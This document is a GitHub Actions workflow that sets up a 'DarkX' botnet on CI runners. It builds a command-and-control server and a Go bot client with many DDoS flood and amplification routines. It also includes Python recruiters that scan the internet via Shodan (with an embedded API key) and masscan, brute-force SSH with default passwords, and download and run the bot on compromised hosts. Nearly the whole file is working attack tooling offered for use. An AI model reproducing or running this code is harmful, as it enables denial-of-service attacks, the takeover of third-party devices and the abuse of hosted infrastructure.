name: DarkX Botnet
on:
  workflow_dispatch:
    inputs:
      power:
        description: 'Attack Power'
        required: true
        default: '1gb'
        type: choice
        options:
        - '100mb'
        - '1gb'
        - '10gb'
        - '100gb'
        - '1tb'
      recruitment:
        description: 'Auto-Recruitment'
        required: true
        default: 'aggressive'
        type: choice
        options:
        - 'passive'
        - 'active'
        - 'aggressive'
        - 'bruteforce'

jobs:
  deploy-darkx:
    runs-on: ubuntu-latest
    timeout-minutes: 3600

    steps:
    - name: Setup DarkX Environment
      run: |
        mkdir -p darkx && cd darkx
        echo "Installing dependencies..."
        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip nmap masscan hydra
        pip3 install shodan requests paramiko scapy pysnmp

    - name: Create DarkX CNC Server
      run: |
        cd darkx
        cat > cnc.go << 'EOF'
        package main

        import (
            "bufio"
            "fmt"
            "log"
            "net"
            "os"
            "strings"
            "sync"
        )

        var (
            bots   []net.Conn
            botMux sync.Mutex
        )

        func main() {
            go startUserServer()
            startBotServer()
        }

        func startUserServer() {
            listener, _ := net.Listen("tcp", ":5555")
            for {
                conn, _ := listener.Accept()
                go handleUser(conn)
            }
        }

        func startBotServer() {
            listener, _ := net.Listen("tcp", ":4444")
            log.Println("DarkX CNC Started - Ports 5555 (users) & 4444 (bots)")
            for {
                conn, _ := listener.Accept()
                botMux.Lock()
                bots = append(bots, conn)
                count := len(bots)
                botMux.Unlock()
                log.Printf("DarkX Bot Connected: %s (Total: %d)", conn.RemoteAddr(), count)
            }
        }

        func handleUser(conn net.Conn) {
            conn.Write([]byte("=== DarkX Botnet Controller ===\r\n"))
            conn.Write([]byte("Username: "))
            user, _ := bufio.NewReader(conn).ReadString('\n')
            conn.Write([]byte("Password: "))
            pass, _ := bufio.NewReader(conn).ReadString('\n')

            if strings.TrimSpace(user) == "admin" && strings.TrimSpace(pass) == "admin" {
                conn.Write([]byte("Login Successful!\r\n"))
                for {
                    conn.Write([]byte("darkx# "))
                    cmd, _ := bufio.NewReader(conn).ReadString('\n')
                    parts := strings.Fields(cmd)
                    
                    if len(parts) == 0 { continue }
                    
                    switch parts[0] {
                    case "bots":
                        botMux.Lock()
                        conn.Write([]byte(fmt.Sprintf("Bots Online: %d\r\n", len(bots))))
                        botMux.Unlock()
                    case "recruit":
                        conn.Write([]byte("Starting Auto-Recruitment...\r\n"))
                    case "attack":
                        if len(parts) >= 5 {
                            botMux.Lock()
                            for _, bot := range bots {
                                bot.Write([]byte(strings.Join(parts[1:], " ") + "\n"))
                            }
                            botMux.Unlock()
                            conn.Write([]byte(fmt.Sprintf("Attack Sent to %d Bots\r\n", len(bots))))
                        }
                    case "methods":
                        conn.Write([]byte("UDP | TCP | SYN | HTTP | DNS | NTP | MEM | SSDP | CHARGEN | LDAP | GAME | OVH | CF | DESTROY\r\n"))
                    case "kill":
                        os.Exit(0)
                    default:
                        conn.Write([]byte("Unknown Command\r\n"))
                    }
                }
            } else {
                conn.Write([]byte("Access Denied\r\n"))
                conn.Close()
            }
        }
        EOF

    - name: Create DarkX Bot Client
      run: |
        cd darkx
        cat > bot.go << 'EOF'
        package main

        import (
            "bufio"
            "crypto/tls"
            "fmt"
            "math/rand"
            "net"
            "net/http"
            "os/exec"
            "runtime"
            "strconv"
            "strings"
            "time"
        )

        func main() {
            if runtime.GOOS == "linux" {
                exec.Command("sh", "-c", "echo '@reboot sleep 30' | crontab -").Run()
            }
            
            for {
                conn, err := net.Dial("tcp", "CNC_IP:4444")
                if err == nil {
                    handleCNC(conn)
                }
                time.Sleep(10 * time.Second)
            }
        }

        func handleCNC(conn net.Conn) {
            defer conn.Close()
            scanner := bufio.NewScanner(conn)
            for scanner.Scan() {
                cmd := scanner.Text()
                parts := strings.Fields(cmd)
                if len(parts) < 4 { continue }
                
                method, target, portStr, durationStr := parts[0], parts[1], parts[2], parts[3]
                port, _ := strconv.Atoi(portStr)
                duration, _ := strconv.Atoi(durationStr)
                
                go launchAttack(method, target, port, duration)
            }
        }

        func launchAttack(method, target string, port, duration int) {
            end := time.Now().Add(time.Duration(duration) * time.Second)
            workers := 1000
            
            switch strings.ToUpper(method) {
            case "UDP":
                go udpFlood(target, port, end, workers)
            case "TCP":
                go tcpFlood(target, port, end, workers)
            case "SYN":
                go synFlood(target, port, end, workers)
            case "HTTP":
                go httpFlood(target, port, end, workers)
            case "DNS":
                go dnsAmplification(target, port, end)
            case "NTP":
                go ntpAmplification(target, port, end)
            case "MEM":
                go memcachedAmplification(target, port, end)
            case "SSDP":
                go ssdpAmplification(target, port, end)
            case "CHARGEN":
                go chargenAmplification(target, port, end)
            case "LDAP":
                go ldapAmplification(target, port, end)
            case "GAME":
                go gameFlood(target, port, end, workers)
            case "OVH":
                go ovhBypass(target, port, end, workers)
            case "CF":
                go cloudflareBypass(target, port, end, workers)
            case "DESTROY":
                go destroyMode(target, port, end, workers)
            }
        }

        func udpFlood(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                        if err == nil {
                            conn.Write(make([]byte, 65507))
                            conn.Close()
                        }
                    }
                }()
            }
        }

        func tcpFlood(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
                        if err == nil {
                            for i := 0; i < 10 && time.Now().Before(end); i++ {
                                conn.Write(make([]byte, 1460))
                            }
                            conn.Close()
                        }
                    }
                }()
            }
        }

        func synFlood(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
                    }
                }()
            }
        }

        func httpFlood(target string, port int, end time.Time, workers int) {
            tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
            }
            client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
            
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        url := fmt.Sprintf("http://%s:%d/", target, port)
                        req, _ := http.NewRequest("GET", url, nil)
                        client.Do(req)
                    }
                }()
            }
        }

        func dnsAmplification(target string, port int, end time.Time) {
            payload := []byte{0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x69, 0x73, 0x63, 0x03, 0x6f, 0x72, 0x67, 0x00, 0x00, 0x01, 0x00, 0x01}
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func ntpAmplification(target string, port int, end time.Time) {
            payload := []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00}
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func memcachedAmplification(target string, port int, end time.Time) {
            payload := []byte("\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func ssdpAmplification(target string, port int, end time.Time) {
            payload := []byte("M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n")
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func chargenAmplification(target string, port int, end time.Time) {
            payload := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00}
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func ldapAmplification(target string, port int, end time.Time) {
            payload := []byte("0\x84\x00\x00\x00-\x02\x01\x01c\x84\x00\x00\x00$\x04\x00\n\x01\x00\n\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass0\x84\x00\x00\x00\x00")
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func gameFlood(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                        conn.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6E, 0x67, 0x69, 0x6E, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00})
                        conn.Close()
                    }
                }()
            }
        }

        func ovhBypass(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        go func() {
                            conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
                            if conn != nil { conn.Close() }
                        }()
                        go func() {
                            conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                            if conn != nil { 
                                conn.Write(make([]byte, 512))
                                conn.Close()
                            }
                        }()
                    }
                }()
            }
        }

        func cloudflareBypass(target string, port int, end time.Time, workers int) {
            client := &http.Client{
                Timeout: 5 * time.Second,
                Transport: &http.Transport{
                    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
            }

            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        req, _ := http.NewRequest("GET", fmt.Sprintf("http://%s:%d/", target, port), nil)
                        req.Header.Set("X-Forwarded-For", fmt.Sprintf("1.1.1.%d", rand.Intn(255)))
                        client.Do(req)
                    }
                }()
            }
        }

        func destroyMode(target string, port int, end time.Time, workers int) {
            go udpFlood(target, port, end, workers/4)
            go tcpFlood(target, port, end, workers/4)
            go httpFlood(target, port, end, workers/4)
            go dnsAmplification(target, port, end)
        }
        EOF

    - name: Build DarkX Components
      run: |
        cd darkx
        go build -o cnc cnc.go
        GOOS=linux GOARCH=amd64 go build -o bot_x64 bot.go
        GOOS=linux GOARCH=386 go build -o bot_x86 bot.go
        GOOS=linux GOARCH=arm64 go build -o bot_arm64 bot.go
        GOOS=linux GOARCH=arm GOARM=7 go build -o bot_arm7 bot.go

    - name: Create Recruitment Scripts
      run: |
        cd darkx
        
        # Shodan Auto-Recruiter
        cat > recruiter.py << 'EOF'
        import shodan
        import paramiko
        import threading
        import time

        SHODAN_API_KEY = "7PTl6ZKB1dFHrFAmVKoXWsboFCbCrAfY"
        CNC_IP = "YOUR_CNC_IP"

        DEFAULT_CREDS = [
            ("root", "root"), ("admin", "admin"), ("admin", "password"), 
            ("admin", "1234"), ("root", "1234"), ("user", "user")
        ]

        def shodan_scan():
            api = shodan.Shodan(SHODAN_API_KEY)
            targets = []
            queries = [
                'port:22 product:"OpenSSH"',
                'port:23 product:"telnet"',
                'port:80 title:"router"',
                'port:443 "MikroTik"'
            ]
            
            for query in queries:
                try:
                    results = api.search(query)
                    for result in results['matches']:
                        targets.append((result['ip_str'], result['port']))
                except Exception as e:
                    print(f"Shodan error: {e}")
            
            return targets

        def brute_force_ssh(ip, port):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            for username, password in DEFAULT_CREDS:
                try:
                    client.connect(ip, port=port, username=username, password=password, timeout=10)
                    print(f"Success: {ip}:{port} - {username}:{password}")
                    
                    # Deploy bot
                    deploy_cmds = [
                        "wget -O /tmp/darkx http://YOUR_CNC_IP:8000/bot_x64",
                        "chmod +x /tmp/darkx",
                        "nohup /tmp/darkx > /dev/null 2>&1 &"
                    ]
                    
                    for cmd in deploy_cmds:
                        client.exec_command(cmd)
                    
                    client.close()
                    return True
                except:
                    continue
            return False

        def main():
            targets = shodan_scan()
            print(f"Found {len(targets)} targets")
            
            for ip, port in targets[:50]:
                threading.Thread(target=brute_force_ssh, args=(ip, port)).start()
                time.sleep(0.5)

        if __name__ == "__main__":
            main()
        EOF

        # Network Scanner
        cat > netscan.py << 'EOF'
        import subprocess
        import threading
        import paramiko

        def masscan_scan():
            cmd = "masscan 0.0.0.0/0 -p22,23,80,443 --max-rate 1000 -oG masscan_output.txt"
            subprocess.run(cmd, shell=True, timeout=300)

        def brute_force_target(ip, port):
            creds = [("admin", "admin"), ("root", "root")]
            for user, passwd in creds:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, port=port, username=user, password=passwd, timeout=10)
                    ssh.exec_command("curl http://YOUR_CNC_IP:8000/bot_x64 -o /tmp/darkx && chmod +x /tmp/darkx && /tmp/darkx &")
                    ssh.close()
                    return True
                except:
                    pass
            return False

        def main():
            masscan_scan()
            # Parse results and brute force
            print("Network scan completed")

        if __name__ == "__main__":
            main()
        EOF

    - name: Setup Tailscale VPN
      run: |
        curl -fsSL https://tailscale.com/install.sh | sh
        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-${{ github.run_id }}
        echo "TAILSCALE_IP=$(tailscale ip -4)" >> $GITHUB_ENV

    - name: Update Configuration
      run: |
        cd darkx
        sed -i "s/CNC_IP/${{ env.TAILSCALE_IP }}/g" bot.go
        sed -i "s/YOUR_CNC_IP/${{ env.TAILSCALE_IP }}/g" recruiter.py
        sed -i "s/YOUR_CNC_IP/${{ env.TAILSCALE_IP }}/g" netscan.py
        go build -o bot bot.go

    - name: Start DarkX Services
      run: |
        cd darkx
        nohup ./cnc > cnc.log 2>&1 &
        echo "CNC_PID=$!" >> $GITHUB_ENV
        
        python3 -m http.server 8000 > http.log 2>&1 &
        echo "HTTP_PID=$!" >> $GITHUB_ENV
        
        sleep 3

    - name: Deploy Initial Bot Army
      run: |
        cd darkx
        
        case "${{ github.event.inputs.power }}" in
          "100mb") BOTS=50 ;;
          "1gb") BOTS=200 ;;
          "10gb") BOTS=500 ;;
          "100gb") BOTS=1000 ;;
          "1tb") BOTS=2000 ;;
        esac
        
        for i in $(seq 1 $BOTS); do
          nohup ./bot > /dev/null 2>&1 &
        done
        
        echo "BOTS_DEPLOYED=$BOTS" >> $GITHUB_ENV

    - name: Start Auto-Recruitment
      run: |
        cd darkx
        
        case "${{ github.event.inputs.recruitment }}" in
          "passive")
            python3 recruiter.py > recruitment.log 2>&1 &
            ;;
          "active"|"aggressive"|"bruteforce")
            python3 recruiter.py > recruitment.log 2>&1 &
            python3 netscan.py > netscan.log 2>&1 &
            ;;
        esac

    - name: Display Status
      run: |
        echo ""
        echo "=== DarkX Botnet Ready ==="
        echo "CNC IP: ${{ env.TAILSCALE_IP }}"
        echo "User Port: 5555"
        echo "Bot Port: 4444"
        echo "Bots Deployed: ${{ env.BOTS_DEPLOYED }}"
        echo "Power Level: ${{ github.event.inputs.power }}"
        echo "Recruitment: ${{ github.event.inputs.recruitment }}"
        echo ""
        echo "Connect: telnet ${{ env.TAILSCALE_IP }} 5555"
        echo "Login: admin / admin"
        echo ""

    - name: Maintain System
      run: |
        while true; do
          if ! ps -p ${{ env.CNC_PID }} > /dev/null; then
            cd darkx && nohup ./cnc > cnc.log 2>&1 &
          fi
          
          CURRENT_BOTS=$(ps aux | grep bot | grep -v grep | wc -l)
          if [ $CURRENT_BOTS -lt $(({{ env.BOTS_DEPLOYED }} / 2)) ]; then
            cd darkx
            for i in $(seq 1 50); do
              nohup ./bot > /dev/null 2>&1 &
            done
          fi
          
          echo "[$(date)] Bots: $CURRENT_BOTS | CNC: ${{ env.TAILSCALE_IP }}"
          sleep 30
        done
